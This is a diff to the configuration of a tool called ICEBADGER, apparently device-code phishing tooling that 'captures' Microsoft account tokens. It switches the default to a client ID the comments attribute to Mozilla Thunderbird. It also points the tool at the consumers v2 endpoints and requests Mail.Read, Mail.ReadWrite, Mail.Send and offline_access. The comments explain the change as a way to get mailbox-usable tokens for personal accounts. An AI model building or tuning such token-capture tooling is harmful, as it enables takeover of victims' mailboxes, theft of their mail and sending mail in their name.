@@ -14,22 +14,31 @@ class Config:
     
     # Microsoft Entra ID Specifics
     CLIENT_ID = os.getenv("ICEBADGER_CLIENT_ID")
-    # First-party Microsoft Office client — supports device-code flow for
-    # consumer (personal) accounts as well as work/school. Used when the
-    # deployment targets personal accounts (outlook.com, live.com, etc.).
-    PERSONAL_CLIENT_ID = os.getenv("ICEBADGER_PERSONAL_CLIENT_ID", "d3590ed6-52b3-4102-aeff-aad2292ab01c")
+    # Public client used for personal (consumer) captures.
+    # Mozilla Thunderbird: a genuine third-party public client that Microsoft
+    # has pre-authorised for Graph Mail scopes AND that supports personal
+    # Microsoft accounts. The Office first-party client also works for
+    # capture, but its MSA tokens carry no `oid` claim, so every mailbox
+    # endpoint (/me/mailFolders, /me/messages) rejects them. Thunderbird
+    # tokens resolve correctly.
+    PERSONAL_CLIENT_ID = os.getenv("ICEBADGER_PERSONAL_CLIENT_ID", "9e5f94bc-e8a4-4e73-b8be-63364c29d753")
     TENANT_ID = os.getenv("ICEBADGER_TENANT_ID", "common")
     SCOPE = os.getenv("ICEBADGER_SCOPES", "https://graph.microsoft.com/.default openid profile offline_access")
     
     DEVICE_CODE_URL = os.getenv("ICEBADGER_DEVICE_CODE_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode")
     TOKEN_URL = os.getenv("ICEBADGER_TOKEN_URL", f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token")
-    # v1 endpoints — proven working for personal (consumer) accounts with the
-    # Office first-party client and resource=https://graph.windows.net.
-    DEVICE_CODE_URL_V1 = "https://login.microsoftonline.com/common/oauth2/devicecode"
-    TOKEN_URL_V1 = "https://login.microsoftonline.com/common/oauth2/token"
-    # Resource requested for personal (consumer) captures. Microsoft Graph, not
-    # graph.windows.net, so the captured token works against /me/messages and
-    # /me/mailFolders straight away (the Office client carries Mail.ReadWrite).
+    # Personal captures use the v2 endpoints on the CONSUMERS authority —
+    # the only combination that both accepts personal accounts and yields a
+    # Graph-scoped delegated token with a resolvable user identity.
+    DEVICE_CODE_URL_V1 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode"
+    TOKEN_URL_V1 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
+    # Graph mail scopes for personal captures (Thunderbird client).
+    PERSONAL_SCOPES = os.getenv(
+        "ICEBADGER_PERSONAL_SCOPES",
+        "https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite "
+        "https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access",
+    )
+    # Legacy v1 resource form (still used by the work/PRT chain).
     PERSONAL_RESOURCE = "https://graph.microsoft.com"
     
     # Polling
